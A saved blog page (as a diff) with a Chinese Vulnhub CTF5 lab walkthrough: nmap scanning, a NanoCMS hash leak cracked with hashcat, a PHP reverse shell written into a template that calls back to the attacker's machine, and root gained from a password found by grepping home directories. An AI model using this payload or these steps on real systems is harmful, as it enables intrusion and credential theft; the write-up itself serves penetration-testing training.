@@ -1,0 +1,756 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    [Vulnhub靶机通关]CTF5 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="[TOC]  外网打点  主机发现+端口扫描 1nmap -sn 192.168.139.141&#x2F;24  确认目标主机为192.168.139.147 详细信息扫描： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[Vulnhub靶机通关]CTF5">
+<meta property="og:url" content="http://example.com/2026/03/16/[Vulnhub%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3]CTF5/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="[TOC]  外网打点  主机发现+端口扫描 1nmap -sn 192.168.139.141&#x2F;24  确认目标主机为192.168.139.147 详细信息扫描： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2026/03/16/images/image-20260316165040627.png">
+<meta property="og:image" content="http://example.com/2026/03/16/images/image-20260316170254645.png">
+<meta property="og:image" content="http://example.com/2026/03/16/images/image-20260316170346215.png">
+<meta property="og:image" content="http://example.com/2026/03/16/images/image-20260316172218655.png">
+<meta property="og:image" content="http://example.com/2026/03/16/images/20230630-3de51fe8.png">
+<meta property="og:image" content="http://example.com/2026/03/16/images/20230630-32d9530f.png">
+<meta property="og:image" content="http://example.com/2026/03/16/images/image-20260316172334250.png">
+<meta property="og:image" content="http://example.com/2026/03/16/images/20230630-42b16d22.png">
+<meta property="og:image" content="http://example.com/2026/03/16/images/image-20260316172544368.png">
+<meta property="og:image" content="http://example.com/2026/03/16/images/image-20260316172643663.png">
+<meta property="og:image" content="http://example.com/2026/03/16/images/image-20260316172729273.png">
+<meta property="og:image" content="http://example.com/2026/03/16/images/20230630-8c39f894.png">
+<meta property="og:image" content="http://example.com/2026/03/16/images/20230630-b21564b2.png">
+<meta property="og:image" content="http://example.com/2026/03/16/images/20230630-e8ced87a.png">
+<meta property="og:image" content="http://example.com/2026/03/16/images/640.png">
+<meta property="article:published_time" content="2026-03-16T08:48:36.000Z">
+<meta property="article:modified_time" content="2026-03-17T08:19:52.602Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="Vulnhub">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2026/03/16/images/image-20260316165040627.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="[Vulnhub靶机通关]CTF5">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">[Vulnhub靶机通关]CTF5</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text"> 外网打点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.</span> <span class="toc-text"> 主机发现+端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nanocms-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0"><span class="toc-number">1.2.</span> <span class="toc-text"> NanoCMS 信息泄露+登录后台</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nanocms-%E6%A8%A1%E6%9D%BF%E7%BC%96%E8%BE%91rce"><span class="toc-number">1.3.</span> <span class="toc-text"> NanoCMS 模板编辑RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text"> 后渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%8F%90%E6%9D%83"><span class="toc-number">2.1.</span> <span class="toc-text"> 敏感信息泄露提权</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-[Vulnhub靶机通关]CTF5" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2026/03/16/%5BVulnhub%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%5DCTF5/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2026-03-16T08:48:36.000Z" itemprop="datePublished">2026-03-16</time>
+    <time style="display: none;" id="post-update-time">2026-03-17</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F/" data-aos="zoom-in">渗透</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p>[TOC]</p>
+<h2 id="外网打点"><a class="markdownIt-Anchor" href="#外网打点"></a> 外网打点</h2>
+<h3 id="主机发现端口扫描"><a class="markdownIt-Anchor" href="#主机发现端口扫描"></a> 主机发现+端口扫描</h3>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.139.141/24</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260316165040627.png" alt="image-20260316165040627" /></p>
+<p>确认目标主机为<code>192.168.139.147</code></p>
+<p>详细信息扫描：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">└─<span class="comment"># nmap -sS -sV -T5 -sC -p- --min-rate 10000 192.168.139.147</span></span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-16 16:52 CST</span><br><span class="line">Nmap scan report for 192.168.139.147</span><br><span class="line">Host is up (0.0020s latency).</span><br><span class="line">Not shown: 65524 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">22/tcp    open  ssh         OpenSSH 4.7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 05:c3:aa:15:2b:57:c7:f4:2b:d3:41:1c:74:76:cd:3d (DSA)</span><br><span class="line">|_  2048 43:fa:3c:08:ab:e7:8b:39:c3:d6:f3:a4:54:19:fe:a6 (RSA)</span><br><span class="line">25/tcp    open  smtp        Sendmail 8.14.1/8.14.1</span><br><span class="line">| smtp-commands: localhost.localdomain Hello <span class="section">[192.168.139.141]</span>, pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, 8BITMIME, SIZE, DSN, ETRN, AUTH DIGEST-MD5 CRAM-MD5, DELIVERBY, HELP</span><br><span class="line">|_ 2.0.0 This is sendmail 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use &quot;HELP &lt;topic&gt;&quot;. 2.0.0 To report bugs in the implementation see 2.0.0 http://www.sendmail.org/email-addresses.html 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info</span><br><span class="line">80/tcp    open  http        Apache httpd 2.2.6 ((Fedora))</span><br><span class="line">|_http-server-header: Apache/2.2.6 (Fedora)</span><br><span class="line">|_http-title: Phake Organization</span><br><span class="line">110/tcp   open  pop3        ipop3d 2006k.101</span><br><span class="line">|_ssl-date: 2026-03-16T04:56:07+00:00<span class="comment">; -3h58m19s from scanner time.</span></span><br><span class="line">| ssl-cert: Subject: <span class="attr">commonName</span>=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--</span><br><span class="line">| Not valid before: 2009-04-29T11:31:53</span><br><span class="line">|_Not valid after:  2010-04-29T11:31:53</span><br><span class="line">|_pop3-capabilities: USER STLS LOGIN-DELAY(180) TOP UIDL</span><br><span class="line">111/tcp   open  rpcbind     2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100024  1          32768/udp   status</span><br><span class="line">|_  100024  1          37083/tcp   status</span><br><span class="line">139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)</span><br><span class="line">143/tcp   open  imap        University of Washington IMAP imapd 2006k.396 (time zone: -0400)</span><br><span class="line">|_ssl-date: 2026-03-16T04:56:07+00:00<span class="comment">; -3h58m20s from scanner time.</span></span><br><span class="line">| ssl-cert: Subject: <span class="attr">commonName</span>=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--</span><br><span class="line">| Not valid before: 2009-04-29T11:31:53</span><br><span class="line">|_Not valid after:  2010-04-29T11:31:53</span><br><span class="line">|_imap-capabilities: CHILDREN WITHIN MULTIAPPEND <span class="attr">THREAD</span>=REFERENCES IDLE UNSELECT LOGIN-REFERRALS OK LITERAL+ completed ESEARCH UIDPLUS CAPABILITY MAILBOX-REFERRALS SORT STARTTLSA0001 SASL-IR BINARY IMAP4REV1 SCAN NAMESPACE THREAD=ORDEREDSUBJECT</span><br><span class="line">445/tcp   open  netbios-ssn Samba smbd 3.0.26a-6.fc8 (workgroup: MYGROUP)</span><br><span class="line">901/tcp   open  http        Samba SWAT administration server</span><br><span class="line">|_http-title: 401 Authorization Required</span><br><span class="line">3306/tcp  open  mysql       MySQL 5.0.45</span><br><span class="line">| mysql-info: </span><br><span class="line">|   Protocol: 10</span><br><span class="line">|   Version: 5.0.45</span><br><span class="line">|   Thread ID: 4</span><br><span class="line">|   Capabilities flags: 41516</span><br><span class="line">|   Some Capabilities: SupportsCompression, Support41Auth, LongColumnFlag, ConnectWithDatabase, SupportsTransactions, Speaks41ProtocolNew</span><br><span class="line">|   Status: Autocommit</span><br><span class="line">|_  Salt: 3NlVJP3Opf1_it*pw%QF</span><br><span class="line">37083/tcp open  status      1 (RPC <span class="comment">#100024)</span></span><br><span class="line">MAC Address: 00:0C:29:31:8E:BD (VMware)</span><br><span class="line">Service Info: Hosts: localhost.localdomain, 192.168.139.147<span class="comment">; OS: Unix</span></span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Unix (Samba 3.0.26a-6.fc8)</span><br><span class="line">|   Computer name: localhost</span><br><span class="line">|   NetBIOS computer name: </span><br><span class="line">|   Domain name: localdomain</span><br><span class="line">|   FQDN: localhost.localdomain</span><br><span class="line">|_  System time: 2026-03-16T00:54:55-04:00</span><br><span class="line">|_clock-skew: mean: -2h58m19s, deviation: 2h00m01s, median: -3h58m20s</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: &lt;blank&gt;</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 91.76 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>整理结果：</p>
+<p><strong>操作系统</strong>: Unix（Samba 3.0.26a-6.fc8）</p>
+<p>开放22(SSH)、25(SMTP)、80(web服务)、110、111、139、143、445、901(web服务)、3306(MySQL)、37083</p>
+<h3 id="nanocms-信息泄露登录后台"><a class="markdownIt-Anchor" href="#nanocms-信息泄露登录后台"></a> NanoCMS 信息泄露+登录后台</h3>
+<p>查看80端口</p>
+<p><img src="../images/image-20260316170254645.png" alt="image-20260316170254645" /></p>
+<p><img src="../images/image-20260316170346215.png" alt="image-20260316170346215" /></p>
+<p>是NanoCMS</p>
+<p><img src="../images/image-20260316172218655.png" alt="image-20260316172218655" /></p>
+<p>这里可以登录</p>
+<p>Google搜索nanocms的exp，搜索到有一个信息泄露，尝试访问查看细节。</p>
+<p><img src="../images/20230630-3de51fe8.png" alt="img" /></p>
+<p>看到cms访问这个文件路径会泄露密码的hash值</p>
+<p><img src="../images/20230630-32d9530f.png" alt="img" /></p>
+<p>利用漏洞获得账户为admin，与一个密码hash值</p>
+<p><img src="../images/image-20260316172334250.png" alt="image-20260316172334250" /></p>
+<p>先判断是什么hash加密</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash-identifier &#x27;9d2f75377ac0ab991d40c91fd27e52fd&#x27; #判断密文的加密形式</span><br></pre></td></tr></table></figure>
+<p><img src="../images/20230630-42b16d22.png" alt="img" /></p>
+<p>使用hashcat去破解,获得密码<code>shannon</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 0 -a 0 9d2f75377ac0ab991d40c91fd27e52fd /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+<p>直接登录：<br />
+<img src="../images/image-20260316172544368.png" alt="image-20260316172544368" /></p>
+<h3 id="nanocms-模板编辑rce"><a class="markdownIt-Anchor" href="#nanocms-模板编辑rce"></a> NanoCMS 模板编辑RCE</h3>
+<p><img src="../images/image-20260316172643663.png" alt="image-20260316172643663" /></p>
+<p>这里可以编辑模板</p>
+<p>直接写入反弹shell:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php exec(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.139.141/9999 0&gt;&amp;1&#x27;&quot;);?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260316172729273.png" alt="image-20260316172729273" /></p>
+<p>访问对应页面getshell</p>
+<h2 id="后渗透"><a class="markdownIt-Anchor" href="#后渗透"></a> 后渗透</h2>
+<h3 id="敏感信息泄露提权"><a class="markdownIt-Anchor" href="#敏感信息泄露提权"></a> 敏感信息泄露提权</h3>
+<p>先升级为python交互式shell：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+<p><strong>从用户的历史记录查找敏感信息pass</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">grep -R -i password /home/* 2&gt; /dev/null</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-R 选项（或 -r）</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">递归搜索：不仅搜索指定目录，还会搜索该目录下的所有子目录</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-i 选项</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">忽略大小写：不区分大小写搜索</span></span><br></pre></td></tr></table></figure>
+<p><img src="../images/20230630-8c39f894.png" alt="img" /></p>
+<p>看到有个Root password，尝试去看下这个文件的具体内容 /home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note</p>
+<p><img src="../images/20230630-b21564b2.png" alt="img" /></p>
+<p>找到root密码是 <code>50$cent</code></p>
+<p><img src="../images/20230630-e8ced87a.png" alt="img" /></p>
+<p>执行 <code>su root</code> 提权成功</p>
+<p><img src="../images/640.png" alt="图片" /></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/124691006_p0_master1200.jpg" data-sizes="auto" alt="[Vulnhub靶机通关]Durian" class="lazyload">
+          
+        
+        <a href="/2026/03/18/%5BVulnhub%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%5DDurian/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            [Vulnhub靶机通关]Durian
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/124691006_p0_master1200.jpg" data-sizes="auto" alt="软件系统安全赛2026" class="lazyload">
+        
+      
+      <a href="/2026/03/16/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B2026/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          软件系统安全赛2026
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text"> 外网打点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.</span> <span class="toc-text"> 主机发现+端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nanocms-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0"><span class="toc-number">1.2.</span> <span class="toc-text"> NanoCMS 信息泄露+登录后台</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nanocms-%E6%A8%A1%E6%9D%BF%E7%BC%96%E8%BE%91rce"><span class="toc-number">1.3.</span> <span class="toc-text"> NanoCMS 模板编辑RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text"> 后渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%8F%90%E6%9D%83"><span 